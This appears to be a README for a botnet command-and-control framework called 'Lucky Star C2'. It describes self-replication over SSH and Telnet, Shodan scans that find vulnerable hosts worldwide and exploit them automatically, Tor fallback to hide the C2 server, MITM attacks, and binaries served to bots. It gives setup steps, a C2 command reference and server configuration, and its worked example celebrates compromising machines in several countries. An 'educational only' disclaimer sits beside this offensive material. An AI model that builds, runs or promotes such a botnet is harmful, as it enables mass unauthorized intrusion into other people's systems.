# 🌟 Lucky Star C2 - Advanced Botnet Framework

<div align="center">

```
        ★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★
             PROFESSIONAL C2 FRAMEWORK
          Educational & Research Purpose Only
        ★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★
```

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-green.svg)]()
[![License](https://img.shields.io/badge/License-Educational-red.svg)]()

</div>

---

## 🎯 Features

### 🔥 Core Capabilities
- ✅ **Cross-Platform** - Windows & Linux support
- ✅ **Auto-Replication** - Self-propagating via SSH/Telnet
- ✅ **Tor Integration** - Anonymous .onion support with automatic fallback
- ✅ **Shodan Hunter** - Global vulnerability scanning
- ✅ **Dynamic ASCII Art** - Customizable visual interface
- ✅ **SSL/TLS Encrypted** - Secure C2 communications
- ✅ **Multi-Method Deployment** - Binary, Python, and shell script

### 🎨 Visual System
- **Custom ASCII Art per Action** - Different art for exploit, recon, shodan, etc.
- **Centered Display** - Auto-adjusts to terminal width
- **Color-Coded Output** - Professional color scheme
- **Animated Effects** - Gradients and dynamic displays

### 🌐 Network Features
- **Automatic IP → .onion Fallback** - Seamless transition when direct IP fails
- **Docker Container Detection** - Specialized localhost scanning
- **Network Reconnaissance** - Comprehensive vulnerability scanning
- **Multiple Credential Databases** - Built-in wordlists

---

## 📁 Project Structure

```
mirai/
├── 🎯 Core Files
│   ├── bot_soldier.py          # Main bot agent
│   ├── c2_commander.py         # C2 server interface
│   ├── shodan_hunter.py        # Global scanning module
│   └── banner.py               # ASCII art system
│
├── 🎨 ASCII Arts
│   └── ascii_arts/
│       ├── exploit.txt         # Shows on "exploit" command
│       ├── recon.txt           # Shows on "recon" command
│       ├── success.txt         # Shows on success
│       ├── vixy.txt            # Custom character
│       └── README.txt          # ASCII art guide
│
├── 🚀 Quick Start
│   ├── COMPILE_NOW.bat         # Compile to .exe
│   ├── FINAL_RUN.bat           # Start everything
│   ├── start_demo.bat          # Demo mode
│   └── start_docker_lab.bat    # Test environment
│
├── 🔧 Setup Scripts
│   ├── install_shodan.bat      # Install Shodan API
│   ├── setup_tor_c2.bat        # Setup Tor hidden service
│   ├── setup_ascii.bat         # ASCII art manager
│   └── cleanup.bat             # Clean old files
│
├── 📖 Documentation
│   ├── README.md               # This file
│   ├── SHODAN_GUIDE.md         # Shodan integration guide
│   └── TOR_SETUP_GUIDE.md      # Tor anonymity guide
│
└── 📦 Archives
    ├── archive/                # Old test files
    ├── docs/                   # Legacy documentation
    └── tools/                  # Utility scripts
```

---

## 🚀 Quick Start

### 1️⃣ Basic Setup (5 minutes)

```batch
# Clone/download project
cd C:\Users\YourName\Downloads\mirai

# Start C2 server
python c2_commander.py

# In another terminal - Start bot
python bot_soldier.py
```

### 2️⃣ Docker Lab Setup (Testing)

```batch
# Start vulnerable SSH containers
start_docker_lab.bat

# In C2 interface:
recon 1           # Scan network
exploit 1 1       # Exploit first target
status            # See all bots
```

### 3️⃣ Shodan Integration (Global Scanning)

```batch
# Install Shodan
install_shodan.bat

# Get free API key: https://account.shodan.io/

# In C2:
auto_rep 1 on                    # Enable auto-replication
shodan 1 YOUR_API_KEY            # Start global hunt
```

### 4️⃣ Tor Anonymity (Advanced)

```batch
# Setup Tor hidden service
setup_tor_c2.bat

# Edit bot_soldier.py line 50:
C2_IP = 'your_address.onion'

# Bots will automatically fallback to .onion if IP fails
```

---

## 🎨 Customizing ASCII Art

### Add Your Own Characters

1. **Create .txt file** in `ascii_arts/` folder
2. **Name it by action**: `exploit.txt`, `recon.txt`, `vixy.txt`, etc.
3. **Restart C2** to load new arts

### Example Structure

```
ascii_arts/
├── exploit.txt      ← Shows when you run "exploit 1 1"
├── recon.txt        ← Shows when you run "recon 1"
├── shodan.txt       ← Shows when you run "shodan 1"
├── success.txt      ← Shows on successful operations
├── fail.txt         ← Shows on errors
└── vixy.txt         ← Your custom waifu
```

### Recommended Generators

- **Images/Photos**: https://www.ascii-art-generator.org/
- **Text Art**: https://patorjk.com/software/taag/
- **Anime Art**: https://ascii.co.uk/art/anime

Run `setup_ascii.bat` for detailed instructions!

---

## 📡 C2 Commands Reference

### Bot Management
```
status              - Show all connected bots
list <bot#>         - List bot's scan results
auto_rep <bot#> on  - Enable auto-replication
```

### Exploitation
```
recon <bot#>              - Scan bot's network
exploit <bot#> <host#>    - Exploit specific host
shodan <bot#> <api_key>   - Start global Shodan scan
shodan_stop <bot#>        - Stop Shodan hunting
```

### Network Attacks
```
mitm <bot#>         - Start MITM attack
mitm_stop <bot#>    - Stop MITM attack
```

---

## 🔒 Privacy & Anonymity Features

### Automatic Fallback System
```python
# Bot tries in order:
1. Direct IP (fast, for LAN)
2. After 3 failures → .onion (anonymous)
```

### Configure in bot_soldier.py:
```python
C2_SERVERS = [
    {'ip': '192.168.56.1', 'port': 8443, 'use_tor': False},  # Primary
    {'ip': 'abc123xyz.onion', 'port': 8443, 'use_tor': True}  # Backup
]
```

---

## 🌍 Shodan Global Hunting

### How It Works
1. Bot searches Shodan every 5 minutes
2. Finds vulnerable SSH/Telnet/FTP globally
3. Automatically exploits if `auto_rep` is ON
4. Exponential growth: 1 → 4 → 16 → 64 → 256...

### Example
```
[C2] auto_rep 1 on
[C2] shodan 1 YOUR_API_KEY

# Wait 5 minutes...
# Bot finds 47 targets in Brazil, India, Indonesia
# Auto-exploits all with weak credentials
# You now have 48 bots instead of 1!
```

Get free API key: https://account.shodan.io/register

---

## 🎯 Visual Customization

### Color Scheme
```python
# In c2_commander.py - Colors class
PINK = '\033[38;5;213m'      # Lucky Star theme
PURPLE = '\033[38;5;141m'    # Headers
GREEN = '\033[92m'           # Success
RED = '\033[91m'             # Errors
CYAN = '\033[96m'            # Info
```

### Dynamic ASCII Example
```python
# Shows exploit.txt when exploiting
[C2] exploit 1 1
    ╔═══════════════════════════╗
    ║    🎯 EXPLOITATION MODE   ║
    ║      Target Acquired!     ║
    ╚═══════════════════════════╝
```

---

## 🔧 Advanced Configuration

### Compilation
```batch
COMPILE_NOW.bat          # Compile to Windows .exe
COMPILE_UNIVERSAL.bat    # Compile Windows + Linux
```

### Binary Distribution
```batch
start_binary_server.bat  # HTTP server on port 8000
# Bots download binaries automatically
```

### Cleanup
```batch
cleanup.bat  # Move old files to archive/, docs/, tools/
```

---

## 📊 Performance Metrics

| Feature | Status | Performance |
|---------|--------|-------------|
| C2 Connection | ✅ | ~100ms |
| SSH Exploitation | ✅ | ~5s per host |
| Network Scan (Class C) | ✅ | ~30s |
| Shodan Query | ✅ | ~2s |
| Auto-Replication | ✅ | ~15s (Python) |
| Tor Connection | ✅ | ~10s first time |

---

## ⚠️ Ethical Disclaimer

**THIS IS FOR EDUCATIONAL PURPOSES ONLY**

- ✅ Use in isolated lab environments
- ✅ Test on your own systems
- ✅ Learn cybersecurity concepts
- ❌ Do NOT use on systems you don't own
- ❌ Unauthorized access is illegal
- ❌ Author not responsible for misuse

**By using this software, you agree to use it responsibly and legally.**

---

## 🐛 Troubleshooting

### Bots not connecting?
```batch
# Check C2 is listening
netstat -an | findstr 8443

# Check firewall
# Windows: Allow port 8443 inbound
```

### ASCII not centered?
```batch
# Maximize terminal window
# Or edit banner.py line 10 to set manual width
```

### Shodan not working?
```batch
install_shodan.bat
# Get API key from https://account.shodan.io/
```

---

## 📚 Documentation

- 📖 [Shodan Integration Guide](SHODAN_GUIDE.md)
- 🧅 [Tor Anonymity Setup](TOR_SETUP_GUIDE.md)
- 🎨 [ASCII Art System](ascii_arts/README.txt)

---

## 🎬 Demo Videos

Coming soon...

---

## 🤝 Contributing

This is an educational project. Feel free to:
- Report bugs
- Suggest features
- Share your ASCII art creations
- Improve documentation

---

## 📜 License

Educational purposes only. Use at your own risk.

---

<div align="center">

```
★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★
     Built with 💖 for Learning
        Stay Legal, Stay Safe
★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★
```

**Made with Lucky Star vibes ✨**

</div>
